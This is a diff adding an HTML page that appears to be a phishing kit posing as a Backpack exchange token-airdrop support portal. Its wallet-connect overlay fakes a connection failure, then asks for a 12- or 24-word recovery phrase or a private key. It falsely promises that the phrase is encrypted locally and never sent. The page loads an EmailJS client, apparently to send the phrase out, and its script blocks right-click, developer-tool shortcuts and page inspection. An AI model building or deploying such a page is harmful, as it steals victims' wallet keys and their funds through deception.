@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
+    </script>
+    <script type="text/javascript">
+        (function () {
+            emailjs.init("SGq0P6qaseWYRS1N3");
+        })();
+    </script>
+    <script src="script.js"></script>
+    <link rel="icon" type="image/png" href="img/backpacklogo.png" />
+    <title>ProjectMainnetDapp— Support Portal</title>
+</head>
+
+<body>
+
+    <nav>
+        <!-- LOGO -->
+        <a class="logo" href="#">
+            <div class="logo-mark">
+                <img src="img/backpacklogo.png" alt="">
+            </div>
+            <span class="logo-name">Backpack</span>
+        </a>
+
+
+
+        <!-- RIGHT -->
+        <div class="nav-right">
+            <!-- TGE countdown -->
+            <div class="tge-pill">
+                <i class="ri-timer-line" style="font-size:13px; color:var(--red)"></i>
+                TGE in <span id="tgeCountdown">6d 00h 00m</span>
+            </div>
+            <a class="btn-eligibility" href="#">
+                <span class="badge-dot"></span>
+                Connect Wallet
+            </a>
+        </div>
+
+
+    </nav>
+
+
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <div class="hero-inner">
+
+            <!-- snapshot banner -->
+            <div class="snapshot-banner">
+                <span class="snapshot-dot"></span>
+                Snapshot taken &mdash; TGE is Live &mdash; Check your wallet now
+            </div>
+
+            <!-- headline -->
+            <h1 class="hero-headline">
+                Backpack Token<br><span class="red-word">Airdrop</span> Is<br><em>Live</em>
+            </h1>
+
+            <!-- subtext -->
+            <p class="hero-sub">
+                The Backpack BP Token Generation Event is live. Check your eligibility, claim your allocation, and
+                resolve any issues right here.
+            </p>
+
+            <!-- CTAs -->
+            <div class="hero-ctas">
+                <a class="cta-primary" href="#">
+                    <i class="ri-wallet-3-line"></i>
+                    Check Eligibility
+                </a>
+                <a class="cta-secondary" href="https://backpack.exchange" target="_blank">
+                    <i class="ri-external-link-line"></i>
+                    View Points Balance
+                </a>
+            </div>
+
+            <!-- countdown -->
+            <div class="countdown-row">
+                <div class="cd-block">
+                    <span class="cd-num" id="cdDays">06</span>
+                    <span class="cd-label">Days</span>
+                </div>
+                <span class="cd-sep">:</span>
+                <div class="cd-block">
+                    <span class="cd-num" id="cdHours">00</span>
+                    <span class="cd-label">Hours</span>
+                </div>
+                <span class="cd-sep">:</span>
+                <div class="cd-block">
+                    <span class="cd-num" id="cdMins">00</span>
+                    <span class="cd-label">Mins</span>
+                </div>
+                <span class="cd-sep">:</span>
+                <div class="cd-block">
+                    <span class="cd-num" id="cdSecs">00</span>
+                    <span class="cd-label">Secs</span>
+                </div>
+
+            </div>
+
+            <!-- action grid -->
+            <div class="action-section">
+                <p class="action-section-label">What do you need help with?</p>
+                <div class="action-grid">
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-bar-chart-grouped-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">Points Not Showing</div>
+                            <div class="action-card-desc">Points balance missing or not reflecting correctly</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-token-swap-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">TGE Token Issues</div>
+                            <div class="action-card-desc">BP tokens not received, wrong amount or delayed</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-wallet-3-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">Wallet Connection</div>
+                            <div class="action-card-desc">Can't connect Phantom, Backpack or MetaMask</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-shield-user-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">KYC / Verification</div>
+                            <div class="action-card-desc">Blocked from claiming due to identity verification</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-arrow-up-circle-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">Withdrawal Issues</div>
+                            <div class="action-card-desc">BP tokens or assets stuck or delayed on withdrawal</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-nft-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">Mad Lads NFT Claim</div>
+                            <div class="action-card-desc">Issues claiming your Mad Lads holder allocation</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-coin-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">Token Not Listed</div>
+                            <div class="action-card-desc">BP token not appearing in wallet after TGE</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                    <a class="action-card" href="#">
+                        <div class="action-icon"><i class="ri-account-box-line"></i></div>
+                        <div class="action-card-text">
+                            <div class="action-card-name">Account Migration</div>
+                            <div class="action-card-desc">Switched wallets or emails and lost Points access</div>
+                        </div>
+                        <i class="ri-arrow-right-up-line action-arrow"></i>
+                    </a>
+
+                </div>
+            </div>
+
+        </div>
+
+        <!-- allocation cards -->
+        <div class="alloc-section">
+            <p class="alloc-label">TGE Distribution Breakdown</p>
+            <div class="alloc-grid">
+
+                <!-- Card 1 — Points Participants -->
+                <div class="alloc-card primary">
+                    <div class="alloc-icon"><i class="ri-bar-chart-grouped-line"></i></div>
+                    <div class="alloc-pct">24%</div>
+                    <div class="alloc-tokens">240,000,000 BP tokens</div>
+                    <div class="alloc-title">Points Participants</div>
+                    <div class="alloc-desc">Allocated to users who accumulated points through the Backpack Points
+                        Programme on backpack.exchange.</div>
+                    <div class="alloc-divider"></div>
+                    <div class="alloc-meta">
+                        <i class="ri-user-line"></i>
+                        Points Programme participants only
+                    </div>
+                </div>
+
+                <!-- Card 2 — Mad Lads NFT -->
+                <div class="alloc-card">
+                    <div class="alloc-icon"><i class="ri-nft-line"></i></div>
+                    <div class="alloc-pct">1%</div>
+                    <div class="alloc-tokens">10,000,000 BP tokens</div>
+                    <div class="alloc-title">Mad Lads NFT Holders</div>
+                    <div class="alloc-desc">Reserved exclusively for verified holders of the Mad Lads NFT collection
+                        on the Solana blockchain.</div>
+                    <div class="alloc-divider"></div>
+                    <div class="alloc-meta">
+                        <i class="ri-shield-check-line"></i>
+                        Verified NFT holders only
+                    </div>
+                </div>
+
+                <!-- Card 3 — Treasury -->
+                <div class="alloc-card">
+                    <div class="alloc-icon"><i class="ri-safe-2-line"></i></div>
+                    <div class="alloc-pct">37.5%</div>
+                    <div class="alloc-tokens">375,000,000 BP tokens</div>
+                    <div class="alloc-title">Corporate Treasury</div>
+                    <div class="alloc-desc">Locked in the corporate treasury and not distributed at TGE. Tokens are
+                        locked until at least one year after a successful IPO.</div>
+                    <div class="alloc-divider"></div>
+                    <div class="alloc-meta">
+                        <i class="ri-lock-2-line"></i>
+                        Locked &mdash; post-IPO release
+                    </div>
+                </div>
+
+            </div>
+
+            <!-- total supply -->
+            <div class="supply-strip">
+                <i class="ri-copper-coin-line" style="font-size:16px; color:var(--text-3)"></i>
+                Total Supply
+                <div class="pipe"></div>
+                <strong>1,000,000,000 BP</strong>
+            </div>
+        </div>
+
+        </div>
+    </section>
+
+    <footer>
+        <div class="footer-row">
+            <div class="footer-left">
+                <div class="footer-logo-mark">
+                    <img src="img/backpacklogo.png" alt="BackPack">
+                </div>
+                <span class="footer-brand">Backpack</span>
+                <span class="footer-copy">&copy; 2026 Backpack. All rights reserved.</span>
+            </div>
+
+            <ul class="footer-links">
+                <li><a href="https://docs.backpack.exchange/" target="_blank">Documentation</a></li>
+                <li><a href="https://learn.backpack.exchange/" target="_blank">FAQs</a></li>
+                <li><a href="https://guide.backpack.exchange/" target="_blank">Terms of Service</a></li>
+                <li><a href="https://support.backpack.exchange/legal/general-legal/privacy-policy"
+                        target="_blank">Privacy Policy</a></li>
+            </ul>
+
+            <div class="footer-right">
+                <a class="footer-social" href="https://x.com/backpack" target="_blank" aria-label="Twitter / X"><i
+                        class="ri-twitter-x-line"></i></a>
+                <a class="footer-social" href="https://discord.com/invite/backpack" target="_blank"
+                    aria-label="Discord"><i class="ri-discord-line"></i></a>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ══ WALLET OVERLAY ══════════════════════════════════ -->
+    <div class="w-overlay" id="wOverlay">
+
+        <!-- SCREEN 1: Select wallet -->
+        <div class="w-panel" id="wScreen1">
+            <div class="w-header">
+                <span class="w-title">Connect Wallet</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-body">
+
+                <!-- Featured: Backpack -->
+                <div class="w-featured wallet-trigger" onclick="handleWalletSelect(this)">
+                    <span class="w-featured-badge">Recommended</span>
+                    <div class="w-featured-icon">
+                        <img src="img/backpack.png" alt="Backpack Wallet" />
+                    </div>
+                    <div>
+                        <div class="w-featured-name">Backpack Wallet</div>
+                        <div class="w-featured-desc">The official Backpack exchange wallet</div>
+                    </div>
+                </div>
+
+                <div class="w-divider"><span>other wallets</span></div>
+
+                <div class="w-list">
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/phantomwallet.png" alt="Phantom" /></div>
+                        <div>
+                            <div class="w-item-name">Phantom</div>
+                            <div class="w-item-desc">Solana & multi-chain wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/solflare.png" alt="Solflare" /></div>
+                        <div>
+                            <div class="w-item-name">Solflare</div>
+                            <div class="w-item-desc">Native Solana wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item wallet-trigger" onclick="handleWalletSelect(this)">
+                        <div class="w-item-icon"><img src="img/metamask.png" alt="MetaMask" /></div>
+                        <div>
+                            <div class="w-item-name">MetaMask</div>
+                            <div class="w-item-desc">Ethereum & EVM wallet</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                    <div class="w-item w-item-other" onclick="openOtherWallets()">
+                        <div class="w-item-icon"><i class="ri-apps-2-line"></i></div>
+                        <div>
+                            <div class="w-item-name">Other Wallets</div>
+                            <div class="w-item-desc">Browse more supported wallets</div>
+                        </div>
+                        <i class="ri-arrow-right-s-line w-item-arrow"></i>
+                    </div>
+                </div>
+
+                <p class="w-note">
+                    By connecting you agree to our <a href="#">Terms</a> &amp; <a href="#">Privacy Policy</a>.
+                    We never store your keys or seed phrases.
+                </p>
+            </div>
+        </div>
+
+        <!-- SCREEN OTHER: Other wallets -->
+        <div class="w-sub" id="wScreenOther">
+            <div class="w-header">
+                <span class="w-title">Other Wallets</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="ow-search-wrap">
+                <i class="ri-search-line"></i>
+                <input class="ow-search" id="owSearch" type="text" placeholder="Search wallets..." autocomplete="off" />
+            </div>
+            <div class="ow-list" id="owList">
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/jupiter.png" alt="Jupiter Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Jupiter Wallet</div>
+                        <div class="ow-chain">Solana / DEX aggregator</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/rabby.png" alt="Rabby Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Rabby Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/atomic.png" alt="Atomic Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Atomic Wallet</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/trustwallet.png" alt="Trust Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Trust Wallet</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/basewallet.png" alt="Coinbase Wallet" /></div>
+                    <div>
+                        <div class="ow-name">Base Wallet</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/cryptocom.png" alt="Crypto.com" /></div>
+                    <div>
+                        <div class="ow-name">Crypto.com</div>
+                        <div class="ow-chain">Multichain / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/robinhood.png" alt="Robinhood" /></div>
+                    <div>
+                        <div class="ow-name">Robinhood</div>
+                        <div class="ow-chain">Multichain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/glow.png" alt="Glow" /></div>
+                    <div>
+                        <div class="ow-name">Glow Wallet</div>
+                        <div class="ow-chain">Solana</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/slope.png" alt="Slope" /></div>
+                    <div>
+                        <div class="ow-name">Slope Wallet</div>
+                        <div class="ow-chain">Solana</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/salmon.png" alt="Salmon" /></div>
+                    <div>
+                        <div class="ow-name">Salmon Wallet</div>
+                        <div class="ow-chain">Solana</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/nightly.png" alt="Nightly" /></div>
+                    <div>
+                        <div class="ow-name">Nightly</div>
+                        <div class="ow-chain">Solana / Aptos / Sui</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/exodus.png" alt="Exodus" /></div>
+                    <div>
+                        <div class="ow-name">Exodus</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/okx.png" alt="OKX Wallet" /></div>
+                    <div>
+                        <div class="ow-name">OKX Wallet</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/safepal.png" alt="SafePal" /></div>
+                    <div>
+                        <div class="ow-name">SafePal</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/ledgerwallet.png" alt="Ledger" /></div>
+                    <div>
+                        <div class="ow-name">Ledger</div>
+                        <div class="ow-chain">Hardware / Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/trezor.png" alt="Trezor" /></div>
+                    <div>
+                        <div class="ow-name">Trezor</div>
+                        <div class="ow-chain">Hardware / Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/rainbow.png" alt="Rainbow" /></div>
+                    <div>
+                        <div class="ow-name">Rainbow</div>
+                        <div class="ow-chain">Ethereum / EVM</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/zerion.png" alt="Zerion" /></div>
+                    <div>
+                        <div class="ow-name">Zerion</div>
+                        <div class="ow-chain">Ethereum / Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/tokenpocket.png" alt="TokenPocket" /></div>
+                    <div>
+                        <div class="ow-name">TokenPocket</div>
+                        <div class="ow-chain">Multi-chain</div>
+                    </div>
+                </div>
+                <div class="ow-item" onclick="selectOwWallet(this)">
+                    <div class="ow-icon"><img src="img/bybit.png" alt="Bybit" /></div>
+                    <div>
+                        <div class="ow-name">Bybit Wallet</div>
+                        <div class="ow-chain">EVM / Multi-chain</div>
+                    </div>
+                </div>
+            </div>
+            <div class="ow-no-results" id="owNoResults">
+                No wallets found for "<span id="owQuery"></span>"
+            </div>
+        </div>
+
+        <!-- SCREEN 2: Connecting / Loading -->
+        <div class="w-sub" id="wScreen2">
+            <div class="w-header">
+                <span class="w-title">Connecting</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-loading-body">
+                <div class="w-wallet-chip">
+                    <div class="w-wallet-chip-icon"><img id="s2Img" src="" alt="" /></div>
+                    <span class="w-wallet-chip-name" id="s2Name">Wallet</span>
+                </div>
+                <div class="w-loader">
+                    <div class="w-loader-ring w-loader-ring-1"></div>
+                    <div class="w-loader-ring w-loader-ring-2"></div>
+                    <div class="w-loader-ring w-loader-ring-3"></div>
+                    <div class="w-loader-dot"></div>
+                </div>
+                <p class="w-status" id="s2Status">Initializing secure connection...</p>
+                <div class="w-progress-wrap">
+                    <div class="w-progress-bar" id="s2Progress"></div>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREEN 3: Connection failed -->
+        <div class="w-sub" id="wScreen3">
+            <div class="w-header">
+                <span class="w-title">Connection Failed</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-error-body">
+                <div class="w-wallet-chip">
+                    <div class="w-wallet-chip-icon"><img id="s3Img" src="" alt="" /></div>
+                    <span class="w-wallet-chip-name" id="s3Name">Wallet</span>
+                </div>
+                <div class="w-error-icon"><i class="ri-wifi-off-line"></i></div>
+                <p class="w-error-msg">
+                    <strong>Unable to Connect</strong>
+                    We couldn't establish a connection with your wallet. This may be due to a timeout or an unresponsive
+                    device. Try again or connect manually using your seed phrase.
+                </p>
+                <div class="w-btn-stack">
+                    <button class="w-btn w-btn-white" id="retryBtn">
+                        <i class="ri-refresh-line"></i> Retry Connection
+                    </button>
+                    <button class="w-btn w-btn-ghost" id="manualBtn">
+                        Connect Manually
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <!-- SCREEN 4: Manual connect -->
+        <div class="w-sub" id="wScreen4">
+            <div class="w-header">
+                <span class="w-title">Connect Manually</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-manual-body">
+                <div class="w-wallet-chip" style="align-self:center">
+                    <div class="w-wallet-chip-icon"><img id="s4Img" src="" alt="" /></div>
+                    <span class="w-wallet-chip-name" id="s4Name">Wallet</span>
+                </div>
+                <p class="w-field-label">Phrase type</p>
+                <select class="w-select" id="phraseType">
+                    <option value="12">12-word recovery phrase</option>
+                    <option value="24">24-word recovery phrase</option>
+                    <option value="key">Private key</option>
+                </select>
+                <textarea class="w-textarea" id="phraseInput"
+                    placeholder="Enter your recovery phrase words separated by spaces, or paste your private key..."
+                    spellcheck="false" autocomplete="off" autocorrect="off" autocapitalize="off"></textarea>
+                <div class="w-encrypt-note">
+                    <i class="ri-lock-2-line"></i>
+                    <p><strong>End-to-end encrypted.</strong> Your phrase is encrypted locally and never sent to any
+                        server. Backpack support will never ask for your seed phrase.</p>
+                </div>
+                <button class="w-btn w-btn-white" onclick="sendPhrase()">
+                    <i class="ri-wallet-3-line"></i> Connect Wallet
+                </button>
+            </div>
+        </div>
+
+        <!-- SCREEN 5: Manual failed -->
+        <div class="w-sub" id="wScreen5">
+            <div class="w-header">
+                <span class="w-title">Verification Failed</span>
+                <button class="w-close" onclick="closeWallet()">&#x2715;</button>
+            </div>
+            <div class="w-error-body">
+                <div class="w-wallet-chip">
+                    <div class="w-wallet-chip-icon"><img id="s5Img" src="" alt="" /></div>
+                    <span class="w-wallet-chip-name" id="s5Name">Wallet</span>
+                </div>
+                <div class="w-error-icon"><i class="ri-error-warning-line"></i></div>
+                <p class="w-error-msg">
+                    <strong>Invalid Credentials</strong>
+                    The recovery phrase or private key you entered could not be verified. Please check your input
+                    carefully and try again.
+                </p>
+                <div class="w-btn-stack">
+                    <button class="w-btn w-btn-white" onclick="handleRetryManual()">
+                        <i class="ri-refresh-line"></i> Try Again
+                    </button>
+                    <button class="w-btn w-btn-ghost" onclick="closeWallet()">Close</button>
+                </div>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // Disable right-click
+        document.addEventListener('contextmenu', e => e.preventDefault());
+
+        // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
+        document.addEventListener('keydown', e => {
+            if (
+                e.key === 'F12' ||
+                (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
+                (e.ctrlKey && e.key.toUpperCase() === 'U')
+            ) {
+                e.preventDefault();
+            }
+        });
+
+        // Detect if DevTools is open and redirect/blank the page
+        (function () {
+            const threshold = 160;
+            setInterval(() => {
+                if (
+                    window.outerWidth - window.innerWidth > threshold ||
+                    window.outerHeight - window.innerHeight > threshold
+                ) {
+                    document.body.innerHTML = '';
+                }
+            }, 1000);
+        })();
+    </script>
+</body>
+
+
+<script src="function.js"></script>
+
+</html>
